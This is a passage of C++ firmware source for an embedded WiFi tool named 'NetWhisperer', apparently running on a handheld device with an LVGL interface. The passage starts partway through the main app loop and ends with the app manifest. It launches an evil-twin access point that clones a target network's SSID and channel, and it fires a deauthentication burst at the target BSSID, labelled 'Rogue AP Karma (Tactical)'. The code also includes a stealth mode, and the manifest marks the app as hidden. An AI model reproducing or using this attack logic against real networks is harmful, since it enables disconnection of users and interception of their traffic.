                                SeenAp newAp{};
                                memcpy(newAp.record.bssid, targetBssid, 6);
                                strncpy(newAp.record.ssid, targetSsid.c_str(), sizeof(newAp.record.ssid) - 1);
                                newAp.record.channel = channel;
                                newAp.record.rssi = -35;
                                newAp.record.authentication_type = WIFI_AUTHENTICATION_TYPE_OPEN;
                                newAp.firstSeenMs = nowMs();
                                newAp.lastSeenMs = nowMs();
                                newAp.fromCapture = true;
                                ctx.seen[apKey] = newAp;
                            }
                            ctx.selectedKey = apKey;
                            ctx.targetClientKey = targetCliKey;
                            ctx.evilTwinActive = true;
                            ctx.mutex.unlock();
                        }

                        if (ctx.mode != RadioMode::Capture) {
                            lvgl_lock();
                            setMode(&ctx, RadioMode::Capture);
                            lvgl_unlock();
                        }
                        setCaptureLockChannel(channel);
                        startEvilTwinAp(targetSsid.c_str(), channel);
                        sendDeauthBurstOnChannel(targetBssid, channel, nullptr);
                        recordLocalAttack(&ctx, WidsAttackType::RogueApClone, "Rogue AP Karma (Tactical)", targetBssid, channel, 1);

                        // Take the user straight to Tactical AP Detail page!
                        lvgl_lock();
                        showPage(&ctx, Page::Detail);
                        lvgl_unlock();
                    }
                }
                app_manager_stop(event.result.launch_id);
            }
        }
    }

    romhack_keypad_set_media_cb(nullptr);
    if (g_stealth_mode) {
        setStealthMode(&ctx, false);
    }
    g_active_scanner_ctx = nullptr;

    stopTimer(&ctx);
    stopCapture(&ctx);
    stopEvilTwinAp();
    service::wifi::setAutoScanPaused(false);
    restoreLedConfig(&ctx);
    freeCyberHomeImage();

    window_manager_remove(ctx.window);
    check(app_event_unsubscribe(&sub) == ERROR_NONE);
    task_event_group_destruct(&event_group);

    return 0;
}

} // namespace

extern const ::AppManifest manifest = {
    .id = "WifiScanner",
    .name = "NetWhisperer",
    .category = APP_CATEGORY_SYSTEM,
    .location = { APP_LOCATION_MEMORY, reinterpret_cast<void*>(appMain) },
    .flags = APP_MANIFEST_FLAG_HIDDEN,
    .stack = { .depth = 0, .desired_memory_capability = 0 }
};

} // namespace tt::app::wifiscanner